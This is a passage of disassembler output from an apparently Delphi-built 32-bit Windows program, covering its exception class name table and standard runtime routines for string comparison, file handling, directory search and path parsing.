  404a0f:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404a13:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404a17:	00 c0                	add    %al,%al
  404a19:	29 40 00             	sub    %eax,0x0(%eax)
  404a1c:	0f 45 49 6e          	cmovne 0x6e(%ecx),%ecx
  404a20:	76 61                	jbe    0x404a83
  404a22:	6c                   	insb   (%dx),%es:(%edi)
  404a23:	69 64 50 6f 69 6e 74 	imul   $0x65746e69,0x6f(%eax,%edx,2),%esp
  404a2a:	65 
  404a2b:	72 00                	jb     0x404a2d
	...
  404a41:	00 00                	add    %al,(%eax)
  404a43:	00 60 4a             	add    %ah,0x4a(%eax)
  404a46:	40                   	inc    %eax
  404a47:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404a4a:	00 00                	add    %al,(%eax)
  404a4c:	04 47                	add    $0x47,%al
  404a4e:	40                   	inc    %eax
  404a4f:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  404a53:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404a57:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404a5b:	00 c0                	add    %al,%al
  404a5d:	29 40 00             	sub    %eax,0x0(%eax)
  404a60:	0c 45                	or     $0x45,%al
  404a62:	49                   	dec    %ecx
  404a63:	6e                   	outsb  %ds:(%esi),(%dx)
  404a64:	76 61                	jbe    0x404ac7
  404a66:	6c                   	insb   (%dx),%es:(%edi)
  404a67:	69 64 43 61 73 74 8d 	imul   $0x408d7473,0x61(%ebx,%eax,2),%esp
  404a6e:	40 
	...
  404a87:	00 a4 4a 40 00 0c 00 	add    %ah,0xc0040(%edx,%ecx,2)
  404a8e:	00 00                	add    %al,(%eax)
  404a90:	04 47                	add    $0x47,%al
  404a92:	40                   	inc    %eax
  404a93:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  404a97:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404a9b:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404a9f:	00 c0                	add    %al,%al
  404aa1:	29 40 00             	sub    %eax,0x0(%eax)
  404aa4:	0d 45 43 6f 6e       	or     $0x6e6f4345,%eax
  404aa9:	76 65                	jbe    0x404b10
  404aab:	72 74                	jb     0x404b21
  404aad:	45                   	inc    %ebp
  404aae:	72 72                	jb     0x404b22
  404ab0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ab1:	72 8b                	jb     0x404a3e
  404ab3:	c0 00 00             	rolb   $0x0,(%eax)
	...
  404aca:	00 00                	add    %al,(%eax)
  404acc:	e8 4a 40 00 0c       	call   0xc408b1b
  404ad1:	00 00                	add    %al,(%eax)
  404ad3:	00 04 47             	add    %al,(%edi,%eax,2)
  404ad6:	40                   	inc    %eax
  404ad7:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  404adb:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404adf:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404ae3:	00 c0                	add    %al,%al
  404ae5:	29 40 00             	sub    %eax,0x0(%eax)
  404ae8:	10 45 41             	adc    %al,0x41(%ebp)
  404aeb:	63 63 65             	arpl   %esp,0x65(%ebx)
  404aee:	73 73                	jae    0x404b63
  404af0:	56                   	push   %esi
  404af1:	69 6f 6c 61 74 69 6f 	imul   $0x6f697461,0x6c(%edi),%ebp
  404af8:	6e                   	outsb  %ds:(%esi),(%dx)
  404af9:	8d 40 00             	lea    0x0(%eax),%eax
	...
  404b14:	30 4b 40             	xor    %cl,0x40(%ebx)
  404b17:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404b1a:	00 00                	add    %al,(%eax)
  404b1c:	04 47                	add    $0x47,%al
  404b1e:	40                   	inc    %eax
  404b1f:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  404b23:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404b27:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404b2b:	00 c0                	add    %al,%al
  404b2d:	29 40 00             	sub    %eax,0x0(%eax)
  404b30:	0a 45 50             	or     0x50(%ebp),%al
  404b33:	72 69                	jb     0x404b9e
  404b35:	76 69                	jbe    0x404ba0
  404b37:	6c                   	insb   (%dx),%es:(%edi)
  404b38:	65 67 65 90          	gs addr16 gs nop
	...
  404b54:	70 4b                	jo     0x404ba1
  404b56:	40                   	inc    %eax
  404b57:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404b5a:	00 00                	add    %al,(%eax)
  404b5c:	04 47                	add    $0x47,%al
  404b5e:	40                   	inc    %eax
  404b5f:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  404b63:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404b67:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404b6b:	00 c0                	add    %al,%al
  404b6d:	29 40 00             	sub    %eax,0x0(%eax)
  404b70:	0e                   	push   %cs
  404b71:	45                   	inc    %ebp
  404b72:	53                   	push   %ebx
  404b73:	74 61                	je     0x404bd6
  404b75:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  404b78:	76 65                	jbe    0x404bdf
  404b7a:	72 66                	jb     0x404be2
  404b7c:	6c                   	insb   (%dx),%es:(%edi)
  404b7d:	6f                   	outsl  %ds:(%esi),(%dx)
  404b7e:	77 90                	ja     0x404b10
	...
  404b98:	b4 4b                	mov    $0x4b,%ah
  404b9a:	40                   	inc    %eax
  404b9b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404b9e:	00 00                	add    %al,(%eax)
  404ba0:	04 47                	add    $0x47,%al
  404ba2:	40                   	inc    %eax
  404ba3:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  404ba7:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404bab:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404baf:	00 c0                	add    %al,%al
  404bb1:	29 40 00             	sub    %eax,0x0(%eax)
  404bb4:	09 45 43             	or     %eax,0x43(%ebp)
  404bb7:	6f                   	outsl  %ds:(%esi),(%dx)
  404bb8:	6e                   	outsb  %ds:(%esi),(%dx)
  404bb9:	74 72                	je     0x404c2d
  404bbb:	6f                   	outsl  %ds:(%esi),(%dx)
  404bbc:	6c                   	insb   (%dx),%es:(%edi)
  404bbd:	43                   	inc    %ebx
  404bbe:	8b c0                	mov    %eax,%eax
	...
  404bd8:	f4                   	hlt
  404bd9:	4b                   	dec    %ebx
  404bda:	40                   	inc    %eax
  404bdb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404bde:	00 00                	add    %al,(%eax)
  404be0:	04 47                	add    $0x47,%al
  404be2:	40                   	inc    %eax
  404be3:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  404be7:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404beb:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404bef:	00 c0                	add    %al,%al
  404bf1:	29 40 00             	sub    %eax,0x0(%eax)
  404bf4:	0d 45 56 61 72       	or     $0x72615645,%eax
  404bf9:	69 61 6e 74 45 72 72 	imul   $0x72724574,0x6e(%ecx),%esp
  404c00:	6f                   	outsl  %ds:(%esi),(%dx)
  404c01:	72 8b                	jb     0x404b8e
  404c03:	c0 00 00             	rolb   $0x0,(%eax)
	...
  404c1a:	00 00                	add    %al,(%eax)
  404c1c:	38 4c 40 00          	cmp    %cl,0x0(%eax,%eax,2)
  404c20:	10 00                	adc    %al,(%eax)
  404c22:	00 00                	add    %al,(%eax)
  404c24:	04 47                	add    $0x47,%al
  404c26:	40                   	inc    %eax
  404c27:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  404c2b:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  404c2f:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  404c33:	00 c0                	add    %al,%al
  404c35:	29 40 00             	sub    %eax,0x0(%eax)
  404c38:	12 45 45             	adc    0x45(%ebp),%al
  404c3b:	78 74                	js     0x404cb1
  404c3d:	65 72 6e             	gs jb  0x404cae
  404c40:	61                   	popa
  404c41:	6c                   	insb   (%dx),%es:(%edi)
  404c42:	45                   	inc    %ebp
  404c43:	78 63                	js     0x404ca8
  404c45:	65 70 74             	gs jo  0x404cbc
  404c48:	69 6f 6e 90 55 8b ec 	imul   $0xec8b5590,0x6e(%edi),%ebp
  404c4f:	53                   	push   %ebx
  404c50:	89 d3                	mov    %edx,%ebx
  404c52:	89 c2                	mov    %eax,%edx
  404c54:	c1 ea 10             	shr    $0x10,%edx
  404c57:	66 f7 f3             	div    %bx
  404c5a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404c5d:	66 89 01             	mov    %ax,(%ecx)
  404c60:	66 89 13             	mov    %dx,(%ebx)
  404c63:	5b                   	pop    %ebx
  404c64:	5d                   	pop    %ebp
  404c65:	c2 04 00             	ret    $0x4
  404c68:	53                   	push   %ebx
  404c69:	8b d8                	mov    %eax,%ebx
  404c6b:	8b cb                	mov    %ebx,%ecx
  404c6d:	b2 01                	mov    $0x1,%dl
  404c6f:	b8 a4 4a 40 00       	mov    $0x404aa4,%eax
  404c74:	e8 b3 1b 00 00       	call   0x40682c
  404c79:	e8 9a e1 ff ff       	call   0x402e18
  404c7e:	5b                   	pop    %ebx
  404c7f:	c3                   	ret
  404c80:	53                   	push   %ebx
  404c81:	56                   	push   %esi
  404c82:	57                   	push   %edi
  404c83:	8b f9                	mov    %ecx,%edi
  404c85:	8b f2                	mov    %edx,%esi
  404c87:	8b d8                	mov    %eax,%ebx
  404c89:	56                   	push   %esi
  404c8a:	57                   	push   %edi
  404c8b:	8b cb                	mov    %ebx,%ecx
  404c8d:	b2 01                	mov    $0x1,%dl
  404c8f:	b8 a4 4a 40 00       	mov    $0x404aa4,%eax
  404c94:	e8 03 1c 00 00       	call   0x40689c
  404c99:	e8 7a e1 ff ff       	call   0x402e18
  404c9e:	5f                   	pop    %edi
  404c9f:	5e                   	pop    %esi
  404ca0:	5b                   	pop    %ebx
  404ca1:	c3                   	ret
  404ca2:	8b c0                	mov    %eax,%eax
  404ca4:	56                   	push   %esi
  404ca5:	57                   	push   %edi
  404ca6:	53                   	push   %ebx
  404ca7:	89 c6                	mov    %eax,%esi
  404ca9:	89 d7                	mov    %edx,%edi
  404cab:	09 c0                	or     %eax,%eax
  404cad:	74 03                	je     0x404cb2
  404caf:	8b 40 fc             	mov    -0x4(%eax),%eax
  404cb2:	09 d2                	or     %edx,%edx
  404cb4:	74 03                	je     0x404cb9
  404cb6:	8b 52 fc             	mov    -0x4(%edx),%edx
  404cb9:	89 c1                	mov    %eax,%ecx
  404cbb:	39 d1                	cmp    %edx,%ecx
  404cbd:	76 02                	jbe    0x404cc1
  404cbf:	89 d1                	mov    %edx,%ecx
  404cc1:	39 c9                	cmp    %ecx,%ecx
  404cc3:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  404cc5:	74 2a                	je     0x404cf1
  404cc7:	8a 5e ff             	mov    -0x1(%esi),%bl
  404cca:	80 fb 61             	cmp    $0x61,%bl
  404ccd:	72 08                	jb     0x404cd7
  404ccf:	80 fb 7a             	cmp    $0x7a,%bl
  404cd2:	77 03                	ja     0x404cd7
  404cd4:	80 eb 20             	sub    $0x20,%bl
  404cd7:	8a 7f ff             	mov    -0x1(%edi),%bh
  404cda:	80 ff 61             	cmp    $0x61,%bh
  404cdd:	72 08                	jb     0x404ce7
  404cdf:	80 ff 7a             	cmp    $0x7a,%bh
  404ce2:	77 03                	ja     0x404ce7
  404ce4:	80 ef 20             	sub    $0x20,%bh
  404ce7:	38 fb                	cmp    %bh,%bl
  404ce9:	74 d8                	je     0x404cc3
  404ceb:	0f b6 c3             	movzbl %bl,%eax
  404cee:	0f b6 d7             	movzbl %bh,%edx
  404cf1:	29 d0                	sub    %edx,%eax
  404cf3:	5b                   	pop    %ebx
  404cf4:	5f                   	pop    %edi
  404cf5:	5e                   	pop    %esi
  404cf6:	c3                   	ret
  404cf7:	90                   	nop
  404cf8:	53                   	push   %ebx
  404cf9:	56                   	push   %esi
  404cfa:	8b f2                	mov    %edx,%esi
  404cfc:	8b d8                	mov    %eax,%ebx
  404cfe:	8b c6                	mov    %esi,%eax
  404d00:	e8 4f e5 ff ff       	call   0x403254
  404d05:	50                   	push   %eax
  404d06:	8b c6                	mov    %esi,%eax
  404d08:	e8 97 e6 ff ff       	call   0x4033a4
  404d0d:	50                   	push   %eax
  404d0e:	8b c3                	mov    %ebx,%eax
  404d10:	e8 3f e5 ff ff       	call   0x403254
  404d15:	50                   	push   %eax
  404d16:	8b c3                	mov    %ebx,%eax
  404d18:	e8 87 e6 ff ff       	call   0x4033a4
  404d1d:	50                   	push   %eax
  404d1e:	6a 01                	push   $0x1
  404d20:	68 00 04 00 00       	push   $0x400
  404d25:	e8 ba f8 ff ff       	call   0x4045e4
  404d2a:	83 e8 02             	sub    $0x2,%eax
  404d2d:	5e                   	pop    %esi
  404d2e:	5b                   	pop    %ebx
  404d2f:	c3                   	ret
  404d30:	53                   	push   %ebx
  404d31:	51                   	push   %ecx
  404d32:	8b da                	mov    %edx,%ebx
  404d34:	8b d4                	mov    %esp,%edx
  404d36:	e8 21 db ff ff       	call   0x40285c
  404d3b:	83 3c 24 00          	cmpl   $0x0,(%esp)
  404d3f:	74 02                	je     0x404d43
  404d41:	8b c3                	mov    %ebx,%eax
  404d43:	5a                   	pop    %edx
  404d44:	5b                   	pop    %ebx
  404d45:	c3                   	ret
  404d46:	8b c0                	mov    %eax,%eax
  404d48:	53                   	push   %ebx
  404d49:	56                   	push   %esi
  404d4a:	81 c4 00 fc ff ff    	add    $0xfffffc00,%esp
  404d50:	8b f2                	mov    %edx,%esi
  404d52:	8b d8                	mov    %eax,%ebx
  404d54:	68 00 04 00 00       	push   $0x400
  404d59:	8d 44 24 04          	lea    0x4(%esp),%eax
  404d5d:	50                   	push   %eax
  404d5e:	53                   	push   %ebx
  404d5f:	a1 14 c0 40 00       	mov    0x40c014,%eax
  404d64:	50                   	push   %eax
  404d65:	e8 3a f9 ff ff       	call   0x4046a4
  404d6a:	8b c8                	mov    %eax,%ecx
  404d6c:	8b d4                	mov    %esp,%edx
  404d6e:	8b c6                	mov    %esi,%eax
  404d70:	e8 4b e4 ff ff       	call   0x4031c0
  404d75:	81 c4 00 04 00 00    	add    $0x400,%esp
  404d7b:	5e                   	pop    %esi
  404d7c:	5b                   	pop    %ebx
  404d7d:	c3                   	ret
  404d7e:	8b c0                	mov    %eax,%eax
  404d80:	53                   	push   %ebx
  404d81:	56                   	push   %esi
  404d82:	8b da                	mov    %edx,%ebx
  404d84:	8b f0                	mov    %eax,%esi
  404d86:	6a 00                	push   $0x0
  404d88:	68 80 00 00 00       	push   $0x80
  404d8d:	6a 03                	push   $0x3
  404d8f:	6a 00                	push   $0x0
  404d91:	8b c3                	mov    %ebx,%eax
  404d93:	25 f0 00 00 00       	and    $0xf0,%eax
  404d98:	c1 e8 04             	shr    $0x4,%eax
  404d9b:	8b 04 85 8c b0 40 00 	mov    0x40b08c(,%eax,4),%eax
  404da2:	50                   	push   %eax
  404da3:	83 e3 03             	and    $0x3,%ebx
  404da6:	8b 04 9d 80 b0 40 00 	mov    0x40b080(,%ebx,4),%eax
  404dad:	50                   	push   %eax
  404dae:	8b c6                	mov    %esi,%eax
  404db0:	e8 ef e5 ff ff       	call   0x4033a4
  404db5:	50                   	push   %eax
  404db6:	e8 39 f8 ff ff       	call   0x4045f4
  404dbb:	5e                   	pop    %esi
  404dbc:	5b                   	pop    %ebx
  404dbd:	c3                   	ret
  404dbe:	8b c0                	mov    %eax,%eax
  404dc0:	53                   	push   %ebx
  404dc1:	8b d8                	mov    %eax,%ebx
  404dc3:	6a 00                	push   $0x0
  404dc5:	68 80 00 00 00       	push   $0x80
  404dca:	6a 02                	push   $0x2
  404dcc:	6a 00                	push   $0x0
  404dce:	6a 00                	push   $0x0
  404dd0:	68 00 00 00 c0       	push   $0xc0000000
  404dd5:	8b c3                	mov    %ebx,%eax
  404dd7:	e8 c8 e5 ff ff       	call   0x4033a4
  404ddc:	50                   	push   %eax
  404ddd:	e8 12 f8 ff ff       	call   0x4045f4
  404de2:	5b                   	pop    %ebx
  404de3:	c3                   	ret
  404de4:	53                   	push   %ebx
  404de5:	56                   	push   %esi
  404de6:	57                   	push   %edi
  404de7:	51                   	push   %ecx
  404de8:	8b f9                	mov    %ecx,%edi
  404dea:	8b f2                	mov    %edx,%esi
  404dec:	8b d8                	mov    %eax,%ebx
  404dee:	6a 00                	push   $0x0
  404df0:	8d 44 24 04          	lea    0x4(%esp),%eax
  404df4:	50                   	push   %eax
  404df5:	57                   	push   %edi
  404df6:	56                   	push   %esi
  404df7:	53                   	push   %ebx
  404df8:	e8 7f f8 ff ff       	call   0x40467c
  404dfd:	85 c0                	test   %eax,%eax
  404dff:	75 07                	jne    0x404e08
  404e01:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
  404e08:	8b 04 24             	mov    (%esp),%eax
  404e0b:	5a                   	pop    %edx
  404e0c:	5f                   	pop    %edi
  404e0d:	5e                   	pop    %esi
  404e0e:	5b                   	pop    %ebx
  404e0f:	c3                   	ret
  404e10:	53                   	push   %ebx
  404e11:	56                   	push   %esi
  404e12:	57                   	push   %edi
  404e13:	51                   	push   %ecx
  404e14:	8b f9                	mov    %ecx,%edi
  404e16:	8b f2                	mov    %edx,%esi
  404e18:	8b d8                	mov    %eax,%ebx
  404e1a:	6a 00                	push   $0x0
  404e1c:	8d 44 24 04          	lea    0x4(%esp),%eax
  404e20:	50                   	push   %eax
  404e21:	57                   	push   %edi
  404e22:	56                   	push   %esi
  404e23:	53                   	push   %ebx
  404e24:	e8 73 f8 ff ff       	call   0x40469c
  404e29:	85 c0                	test   %eax,%eax
  404e2b:	75 07                	jne    0x404e34
  404e2d:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
  404e34:	8b 04 24             	mov    (%esp),%eax
  404e37:	5a                   	pop    %edx
  404e38:	5f                   	pop    %edi
  404e39:	5e                   	pop    %esi
  404e3a:	5b                   	pop    %ebx
  404e3b:	c3                   	ret
  404e3c:	51                   	push   %ecx
  404e3d:	6a 00                	push   $0x0
  404e3f:	52                   	push   %edx
  404e40:	50                   	push   %eax
  404e41:	e8 46 f8 ff ff       	call   0x40468c
  404e46:	c3                   	ret
  404e47:	90                   	nop
  404e48:	50                   	push   %eax
  404e49:	e8 8e f7 ff ff       	call   0x4045dc
  404e4e:	c3                   	ret
  404e4f:	90                   	nop
  404e50:	55                   	push   %ebp
  404e51:	8b ec                	mov    %esp,%ebp
  404e53:	81 c4 b4 fe ff ff    	add    $0xfffffeb4,%esp
  404e59:	53                   	push   %ebx
  404e5a:	8b d8                	mov    %eax,%ebx
  404e5c:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  404e62:	50                   	push   %eax
  404e63:	8b c3                	mov    %ebx,%eax
  404e65:	e8 3a e5 ff ff       	call   0x4033a4
  404e6a:	50                   	push   %eax
  404e6b:	e8 ac f7 ff ff       	call   0x40461c
  404e70:	83 f8 ff             	cmp    $0xffffffff,%eax
  404e73:	74 34                	je     0x404ea9
  404e75:	50                   	push   %eax
  404e76:	e8 99 f7 ff ff       	call   0x404614
  404e7b:	f6 85 b4 fe ff ff 10 	testb  $0x10,-0x14c(%ebp)
  404e82:	75 25                	jne    0x404ea9
  404e84:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404e87:	50                   	push   %eax
  404e88:	8d 85 c8 fe ff ff    	lea    -0x138(%ebp),%eax
  404e8e:	50                   	push   %eax
  404e8f:	e8 78 f7 ff ff       	call   0x40460c
  404e94:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404e97:	50                   	push   %eax
  404e98:	8d 45 fe             	lea    -0x2(%ebp),%eax
  404e9b:	50                   	push   %eax
  404e9c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404e9f:	50                   	push   %eax
  404ea0:	e8 5f f7 ff ff       	call   0x404604
  404ea5:	85 c0                	test   %eax,%eax
  404ea7:	75 07                	jne    0x404eb0
  404ea9:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  404eb0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404eb3:	5b                   	pop    %ebx
  404eb4:	8b e5                	mov    %ebp,%esp
  404eb6:	5d                   	pop    %ebp
  404eb7:	c3                   	ret
  404eb8:	53                   	push   %ebx
  404eb9:	8b d8                	mov    %eax,%ebx
  404ebb:	8b c3                	mov    %ebx,%eax
  404ebd:	e8 8e ff ff ff       	call   0x404e50
  404ec2:	40                   	inc    %eax
  404ec3:	0f 95 c0             	setne  %al
  404ec6:	5b                   	pop    %ebx
  404ec7:	c3                   	ret
  404ec8:	53                   	push   %ebx
  404ec9:	56                   	push   %esi
  404eca:	57                   	push   %edi
  404ecb:	8b fa                	mov    %edx,%edi
  404ecd:	8b f0                	mov    %eax,%esi
  404ecf:	33 db                	xor    %ebx,%ebx
  404ed1:	57                   	push   %edi
  404ed2:	8b c6                	mov    %esi,%eax
  404ed4:	e8 cb e4 ff ff       	call   0x4033a4
  404ed9:	50                   	push   %eax
  404eda:	e8 a5 f7 ff ff       	call   0x404684
  404edf:	85 c0                	test   %eax,%eax
  404ee1:	75 07                	jne    0x404eea
  404ee3:	e8 54 f7 ff ff       	call   0x40463c
  404ee8:	8b d8                	mov    %eax,%ebx
  404eea:	8b c3                	mov    %ebx,%eax
  404eec:	5f                   	pop    %edi
  404eed:	5e                   	pop    %esi
  404eee:	5b                   	pop    %ebx
  404eef:	c3                   	ret
  404ef0:	53                   	push   %ebx
  404ef1:	83 c4 f8             	add    $0xfffffff8,%esp
  404ef4:	8b d8                	mov    %eax,%ebx
  404ef6:	eb 18                	jmp    0x404f10
  404ef8:	8d 43 18             	lea    0x18(%ebx),%eax
  404efb:	50                   	push   %eax
  404efc:	8b 43 14             	mov    0x14(%ebx),%eax
  404eff:	50                   	push   %eax
  404f00:	e8 1f f7 ff ff       	call   0x404624
  404f05:	85 c0                	test   %eax,%eax
  404f07:	75 07                	jne    0x404f10
  404f09:	e8 2e f7 ff ff       	call   0x40463c
  404f0e:	eb 3f                	jmp    0x404f4f
  404f10:	8b 43 18             	mov    0x18(%ebx),%eax
  404f13:	23 43 10             	and    0x10(%ebx),%eax
  404f16:	75 e0                	jne    0x404ef8
  404f18:	54                   	push   %esp
  404f19:	8d 43 2c             	lea    0x2c(%ebx),%eax
  404f1c:	50                   	push   %eax
  404f1d:	e8 ea f6 ff ff       	call   0x40460c
  404f22:	53                   	push   %ebx
  404f23:	8d 43 02             	lea    0x2(%ebx),%eax
  404f26:	50                   	push   %eax
  404f27:	8d 44 24 08          	lea    0x8(%esp),%eax
  404f2b:	50                   	push   %eax
  404f2c:	e8 d3 f6 ff ff       	call   0x404604
  404f31:	8b 43 38             	mov    0x38(%ebx),%eax
  404f34:	89 43 04             	mov    %eax,0x4(%ebx)
  404f37:	8b 43 18             	mov    0x18(%ebx),%eax
  404f3a:	89 43 08             	mov    %eax,0x8(%ebx)
  404f3d:	8d 43 0c             	lea    0xc(%ebx),%eax
  404f40:	8d 53 44             	lea    0x44(%ebx),%edx
  404f43:	b9 04 01 00 00       	mov    $0x104,%ecx
  404f48:	e8 ef e2 ff ff       	call   0x40323c
  404f4d:	33 c0                	xor    %eax,%eax
  404f4f:	59                   	pop    %ecx
  404f50:	5a                   	pop    %edx
  404f51:	5b                   	pop    %ebx
  404f52:	c3                   	ret
  404f53:	90                   	nop
  404f54:	53                   	push   %ebx
  404f55:	56                   	push   %esi
  404f56:	57                   	push   %edi
  404f57:	8b d9                	mov    %ecx,%ebx
  404f59:	8b f8                	mov    %eax,%edi
  404f5b:	f7 d2                	not    %edx
  404f5d:	83 e2 1e             	and    $0x1e,%edx
  404f60:	89 53 10             	mov    %edx,0x10(%ebx)
  404f63:	8d 43 18             	lea    0x18(%ebx),%eax
  404f66:	50                   	push   %eax
  404f67:	8b c7                	mov    %edi,%eax
  404f69:	e8 36 e4 ff ff       	call   0x4033a4
  404f6e:	50                   	push   %eax
  404f6f:	e8 a8 f6 ff ff       	call   0x40461c
  404f74:	8b f0                	mov    %eax,%esi
  404f76:	89 73 14             	mov    %esi,0x14(%ebx)
  404f79:	46                   	inc    %esi
  404f7a:	74 16                	je     0x404f92
  404f7c:	8b c3                	mov    %ebx,%eax
  404f7e:	e8 6d ff ff ff       	call   0x404ef0
  404f83:	8b f0                	mov    %eax,%esi
  404f85:	85 f6                	test   %esi,%esi
  404f87:	74 10                	je     0x404f99
  404f89:	8b c3                	mov    %ebx,%eax
  404f8b:	e8 34 00 00 00       	call   0x404fc4
  404f90:	eb 07                	jmp    0x404f99
  404f92:	e8 a5 f6 ff ff       	call   0x40463c
  404f97:	8b f0                	mov    %eax,%esi
  404f99:	8b c6                	mov    %esi,%eax
  404f9b:	5f                   	pop    %edi
  404f9c:	5e                   	pop    %esi
  404f9d:	5b                   	pop    %ebx
  404f9e:	c3                   	ret
  404f9f:	90                   	nop
  404fa0:	53                   	push   %ebx
  404fa1:	8b d8                	mov    %eax,%ebx
  404fa3:	8d 43 18             	lea    0x18(%ebx),%eax
  404fa6:	50                   	push   %eax
  404fa7:	8b 43 14             	mov    0x14(%ebx),%eax
  404faa:	50                   	push   %eax
  404fab:	e8 74 f6 ff ff       	call   0x404624
  404fb0:	85 c0                	test   %eax,%eax
  404fb2:	74 09                	je     0x404fbd
  404fb4:	8b c3                	mov    %ebx,%eax
  404fb6:	e8 35 ff ff ff       	call   0x404ef0
  404fbb:	5b                   	pop    %ebx
  404fbc:	c3                   	ret
  404fbd:	e8 7a f6 ff ff       	call   0x40463c
  404fc2:	5b                   	pop    %ebx
  404fc3:	c3                   	ret
  404fc4:	8b 50 14             	mov    0x14(%eax),%edx
  404fc7:	83 fa ff             	cmp    $0xffffffff,%edx
  404fca:	74 06                	je     0x404fd2
  404fcc:	52                   	push   %edx
  404fcd:	e8 42 f6 ff ff       	call   0x404614
  404fd2:	c3                   	ret
  404fd3:	90                   	nop
  404fd4:	53                   	push   %ebx
  404fd5:	8b d8                	mov    %eax,%ebx
  404fd7:	8b c3                	mov    %ebx,%eax
  404fd9:	e8 c6 e3 ff ff       	call   0x4033a4
  404fde:	50                   	push   %eax
  404fdf:	e8 18 f6 ff ff       	call   0x4045fc
  404fe4:	f7 d8                	neg    %eax
  404fe6:	1b c0                	sbb    %eax,%eax
  404fe8:	f7 d8                	neg    %eax
  404fea:	5b                   	pop    %ebx
  404feb:	c3                   	ret
  404fec:	53                   	push   %ebx
  404fed:	56                   	push   %esi
  404fee:	8b f2                	mov    %edx,%esi
  404ff0:	8b d8                	mov    %eax,%ebx
  404ff2:	8b c6                	mov    %esi,%eax
  404ff4:	e8 ab e3 ff ff       	call   0x4033a4
  404ff9:	50                   	push   %eax
  404ffa:	8b c3                	mov    %ebx,%eax
  404ffc:	e8 a3 e3 ff ff       	call   0x4033a4
  405001:	50                   	push   %eax
  405002:	e8 6d f6 ff ff       	call   0x404674
  405007:	f7 d8                	neg    %eax
  405009:	1b c0                	sbb    %eax,%eax
  40500b:	f7 d8                	neg    %eax
  40500d:	5e                   	pop    %esi
  40500e:	5b                   	pop    %ebx
  40500f:	c3                   	ret
  405010:	53                   	push   %ebx
  405011:	56                   	push   %esi
  405012:	57                   	push   %edi
  405013:	55                   	push   %ebp
  405014:	8b ea                	mov    %edx,%ebp
  405016:	8b d8                	mov    %eax,%ebx
  405018:	8b c3                	mov    %ebx,%eax
  40501a:	e8 35 e2 ff ff       	call   0x403254
  40501f:	83 f8 03             	cmp    $0x3,%eax
  405022:	7c 1a                	jl     0x40503e
  405024:	80 7b 01 3a          	cmpb   $0x3a,0x1(%ebx)
  405028:	75 14                	jne    0x40503e
  40502a:	55                   	push   %ebp
  40502b:	b9 02 00 00 00       	mov    $0x2,%ecx
  405030:	ba 01 00 00 00       	mov    $0x1,%edx
  405035:	8b c3                	mov    %ebx,%eax
  405037:	e8 a8 e3 ff ff       	call   0x4033e4
  40503c:	eb 5e                	jmp    0x40509c
  40503e:	8b c3                	mov    %ebx,%eax
  405040:	e8 0f e2 ff ff       	call   0x403254
  405045:	83 f8 02             	cmp    $0x2,%eax
  405048:	7c 4b                	jl     0x405095
  40504a:	80 3b 5c             	cmpb   $0x5c,(%ebx)
  40504d:	75 46                	jne    0x405095
  40504f:	80 7b 01 5c          	cmpb   $0x5c,0x1(%ebx)
  405053:	75 40                	jne    0x405095
  405055:	33 ff                	xor    %edi,%edi
  405057:	be 03 00 00 00       	mov    $0x3,%esi
  40505c:	eb 0e                	jmp    0x40506c
  40505e:	80 7c 33 ff 5c       	cmpb   $0x5c,-0x1(%ebx,%esi,1)
  405063:	75 01                	jne    0x405066
  405065:	47                   	inc    %edi
  405066:	83 ff 02             	cmp    $0x2,%edi
  405069:	7d 01                	jge    0x40506c
  40506b:	46                   	inc    %esi
  40506c:	8b c3                	mov    %ebx,%eax
  40506e:	e8 e1 e1 ff ff       	call   0x403254
  405073:	3b f0                	cmp    %eax,%esi
  405075:	7d 05                	jge    0x40507c
  405077:	83 ff 02             	cmp    $0x2,%edi
  40507a:	7c e2                	jl     0x40505e
  40507c:	80 7c 33 ff 5c       	cmpb   $0x5c,-0x1(%ebx,%esi,1)
  405081:	75 01                	jne    0x405084
  405083:	4e                   	dec    %esi
  405084:	55                   	push   %ebp
  405085:	8b ce                	mov    %esi,%ecx
  405087:	ba 01 00 00 00       	mov    $0x1,%edx
